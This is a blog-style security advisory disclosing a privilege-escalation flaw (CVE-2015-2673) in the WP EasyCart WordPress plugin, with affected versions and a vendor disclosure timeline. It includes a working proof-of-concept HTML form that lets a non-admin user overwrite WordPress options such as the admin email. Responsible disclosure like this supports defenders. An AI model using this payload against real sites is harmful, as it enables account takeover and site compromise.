---
layout: post
title: WP EasyCart Privilege Escalation Information Disclosure
date: 2015-02-26
categories:
  - security
  - websec
  - disclosure
tags:
  - wordpress
  - wp-easycart
  - privilege escalation
---
Due to a lack of validation in the `ec_ajax_update_option` and `ec_ajax_clear_all_taxrates` functions located in `/inc/admin/admin_ajax_functions.php`, it is possible to update any WordPress option as an authenticated non-admin user, which can in turn lead to privilege escalation and remote code execution.

## CVE-ID
[CVE-2015-2673](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2673)

## WPVDB-ID
[7808](https://wpvulndb.com/vulnerabilities/7808)

## Versions Affected
All versions from 1.1.30 to 3.0.20

## Metasploit Module
[http://www.rapid7.com/db/modules/auxiliary/admin/http/wp\_easycart\_privilege\_escalation](http://www.rapid7.com/db/modules/auxiliary/admin/http/wp_easycart_privilege_escalation)

## Proof of Concept
Set the `option_name` and `option_value` fields in the below markup to the option and value you wish to update. For a full list of possible options, see the official [Option Reference](http://codex.wordpress.org/Option_Reference) page.

```xml
<form action="http://wordpress_installation_path_here/wp-admin/admin-ajax.php?action=ec_ajax_update_option" method="post">
    <input type="hidden" name="option_name" value="admin_email" />
    <input type="hidden" name="option_value" value="newaddress@somedomain.com" />
    <button type="submit">Submit</button>
</form>
```

## Disclosure Timeline
* **2015-02-22:** Discovered vulnerability and contacted vendor to disclose
* **2015-02-23:** Acknowledgement from vendor, ETA of 24-48 hours for patch
* **2015-02-23:** Contacted vendor again to disclose same vulnerability in another function (`ec_ajax_clear_all_taxrates`)
* **2015-02-24:** Vendor confirmed issues have been patched and is releasing update shortly
* **2015-02-25:** Version 3.0.20 released by vendor
* **2015-02-25:** Contacted vendor again to let them know the patch did not resolve the issue and it is still exploitable
* **2015-02-25:** Vendor released new update to resolve issues
* **2015-02-25:** CVE-ID requested
* **2015-02-26:** Public disclosure
